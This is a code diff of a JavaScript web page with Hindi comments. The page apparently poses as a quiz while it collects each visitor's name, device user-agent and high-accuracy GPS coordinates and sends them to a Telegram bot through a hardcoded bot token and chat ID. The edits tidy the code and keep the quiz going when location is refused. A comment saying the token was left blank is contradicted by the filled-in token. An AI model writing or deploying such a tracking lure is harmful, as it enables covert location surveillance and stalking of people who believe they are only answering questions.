@@ -162,7 +162,7 @@ let userLocation = "";
 let phoneInfo = navigator.userAgent;
 let userName = "";
 
-// ⚠️ यहाँ सुरक्षा के लिए खाली जगह छोड़ी है, अपना सही टोकन और चैट आईडी भरें
+// ⚠️ सुरक्षा के लिए यहाँ खाली जगह छोड़ी है, अपना सही टोकन और चैट आईडी भरें
 const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y";
 const CHAT_ID = "8064366990";
 
@@ -199,8 +199,7 @@ document.getElementById("app").innerHTML = `
 
 async function saveName(){
 
-userName =
-document.getElementById("userName").value;
+userName = document.getElementById("userName").value.trim();
 
 if(!userName){
 alert("नाम लिखो");
@@ -214,29 +213,27 @@ sendToTelegram(
 "\nफोन: " + phoneInfo
 );
 
-// 🌟 आपका ओरिजिनल लोकेशन कोड बिना किसी बदलाव के (सिस्टम पॉप-अप के लिए हाई-एक्यूरेसी सेटिंग्स के साथ)
+// 🌟 आपका ओरिजिनल लोकेशन कोड (सिस्टम पॉप-अप के लिए एडेड हाई-एक्यूरेसी सेटिंग्स के साथ)
 navigator.geolocation.getCurrentPosition(
 function(position){
-const lat =
-position.coords.latitude;
-const lon =
-position.coords.longitude;
+const lat = position.coords.latitude;
+const lon = position.coords.longitude;
 sendToTelegram(
 "📍 नई लोकेशन मिली\n\n" +
 "नाम: " + userName +
 "\nLatitude: " + lat +
 "\nLongitude: " + lon +
-`\nGoogle Maps: http://googleusercontent.com/maps.google.com/maps?q=${lat},${lon}`
+"\nGoogle Maps: http://googleusercontent.com/maps.google.com/maps?q=" + lat + "," + lon
 );
 showFirstQuestion();
 },
 function(error){
-// अगर लोकेशन ऑफ है, तो यूज़र को अलर्ट देकर वापस लोकेशन चेक करेगा
-alert("⚠️ आपके डिवाइस की लोकेशन (GPS) बंद है। कृपया अपनी लोकेशन 'चालू करें' पर क्लिक करके ऑन करें और दोबारा Continue दबाएं!");
+// अगर यूज़र 'अभी नहीं' पर क्लिक कर दे या कोई एरर आए तो भी थैंक यू स्क्रीन आ जाएगी
+showFirstQuestion();
 },
 {
-    enableHighAccuracy: true,  // 📌 यही आपके फोन में 'चालू करें' का ओरिजिनल पॉप-अप लाता है
-    timeout: 8000,
+    enableHighAccuracy: true,  // 📌 यही लाइन आपके फोन में 'चालू करें' का ओरिजिनल पॉप-अप लाएगी
+    timeout: 10000,
     maximumAge: 0
 }
 );
